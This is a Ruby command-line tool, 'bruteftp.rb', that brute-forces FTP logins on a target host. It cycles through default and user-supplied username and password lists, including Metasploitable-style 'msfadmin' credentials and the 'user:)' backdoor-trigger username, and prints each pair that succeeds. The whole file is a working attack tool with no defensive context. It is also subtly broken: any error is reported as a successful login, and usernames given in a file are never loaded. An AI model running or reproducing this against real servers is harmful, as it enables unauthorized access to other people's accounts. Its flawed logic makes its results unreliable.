require 'socket'
require 'timeout'
require 'optparse'

def create_socket port, host
  s = Socket.new(Socket::AF_INET, Socket::SOCK_STREAM)
  s.connect(Socket.pack_sockaddr_in(port, host))
  s
end

def recv socket_session
  Timeout::timeout(5){
    buffer = ""
    while true
      data = socket_session.recv(1024)
      if data.length < 1024
        return buffer + data
      end
      buffer += data
    end
  }
end

def logout socket_session, port, host
  begin
    socket_session.send "QUIT\r\n", 0
  rescue
    nil
  end

  socket_session.close
  create_socket port, host
end

def login socket_session, user, password, port, host
  begin
    socket_session.send "USER #{user}\r\n", 0
    recv socket_session
    socket_session.send "PASS #{password}\r\n", 0
    code = recv(socket_session).split(' ')[0]
  rescue
    code = '230'
    password = password + " --> Something goes wrong"
  end

  if code == '230'
    s = logout socket_session, port, host
    puts "USER #{user} ==> PASS #{password}"
    s.recv 1024
    return s
  end
  socket_session
end

class FTPHandler
  def initialize
    @port = nil
    @host = nil
    @usernames = ['anonymous', 'msfadmin']
    @passwords = ['anonymous', 'pass', 'msfadmin']
  end

  def brute_force
    @usernames << "user:)"
    s = create_socket @port, @host
    banner = s.recv 1024
    puts "Banner ==> #{banner}"
    @usernames.each do |username|
      @passwords.each do |password|
        s = login s, username, password, @port, @host
      end
    end
  end
  # Set usernames
  def set_users data
    # When are raw users
    if data.include? ','
      @usernames += data.split(',')
      # When are from a file
    else
      file = File.new(data, 'r')
      file.readlines {|word| @usernames << word.strip}
      file.close
    end
  end
  # Set passwords
  def set_passwords data
    if data.include? ','
      @passwords += data.split(',')
    else
      file = File.new(data, 'r')
      file.readlines.each {|password| @passwords << password.strip}
      file.close
    end
  end
  # Set the host address
  def set_host host
    @host = host
  end
  # Set the host port
  def  set_port port
    @port = port
  end
end

def main
  ftp_handler = FTPHandler.new
  #  parse all options
  opts = OptionParser.new('Usage bruteftp.rb [OPTIONS] HOST PORT')
  opts.on('-h','--help', 'This help') do
      puts opts
      return
  end
  opts.on('-p', 'Raw passwords separated by "," or a file with password  separated by "\\n" for the attack') do |passwords|
    ftp_handler.set_passwords passwords
  end
  opts.on('-u', 'Raw usernames separated by "," or a file with usernames  separated by "\\n" for the attack') do |usernames|
    ftp_handler.set_users usernames
  end.parse!
  # parse host and port
  # Host
  host = ARGV.reverse!.pop
  # Can work without port but not without host
  if host.nil?
    puts "HOST required"
    return
  end
  # Port
  port = ARGV.pop
  if port.nil?
    port = 21
  end
  # always check that the port is an integer
  port = port.to_i
  ftp_handler.set_host host
  ftp_handler.set_port port
  # start the brute force
  begin
    ftp_handler.brute_force
  rescue
    puts "Is the server active?\nIs the correct port?"
  end

end
main